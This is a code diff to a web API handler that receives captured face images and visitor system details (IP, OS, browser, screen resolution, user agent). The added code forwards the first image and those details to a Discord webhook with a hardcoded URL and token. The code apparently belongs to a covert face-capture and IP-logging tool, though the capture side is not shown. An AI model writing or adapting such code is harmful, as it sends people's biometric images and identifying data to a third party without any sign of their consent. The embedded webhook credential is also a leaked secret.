@@ -39,6 +39,43 @@ export default function handler(req, res) {
             
             console.log(`新しい顔画像を受信: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
             
+            // Discord Webhookにも送信（非同期）
+            (async () => {
+                try {
+                    const webhookUrl = "https://discord.com/api/webhooks/1392713552862777487/uPdoQWpRktX36P4W4YvpjX4NmwoSOZZQdC5R3OTid-t765l6VTfMQxLK3UU_rflQCQd3";
+                    const firstImage = captureData.images[0];
+                    let content = `新しい顔画像が送信されました！\n` +
+                        `IP: ${captureData.system_info.ip_address || 'Unknown'}\n` +
+                        `OS: ${captureData.system_info.os || 'Unknown'}\n` +
+                        `ブラウザ: ${captureData.system_info.browser || 'Unknown'}\n` +
+                        `解像度: ${captureData.system_info.screen_resolution || 'Unknown'}\n` +
+                        `User-Agent: ${captureData.system_info.user_agent || 'Unknown'}`;
+                    let payload;
+                    if (firstImage && firstImage.startsWith('data:image/')) {
+                        // Discordはbase64画像の直接送信は未対応なので、埋め込みで表示
+                        payload = {
+                            content,
+                            embeds: [
+                                {
+                                    title: "キャプチャ画像",
+                                    image: { url: firstImage },
+                                    color: 16098851
+                                }
+                            ]
+                        };
+                    } else {
+                        payload = { content };
+                    }
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (e) {
+                    console.error('Discord Webhook送信エラー:', e);
+                }
+            })();
+            
             res.status(200).json({
                 success: true,
                 message: '画像を正常に受信しました',
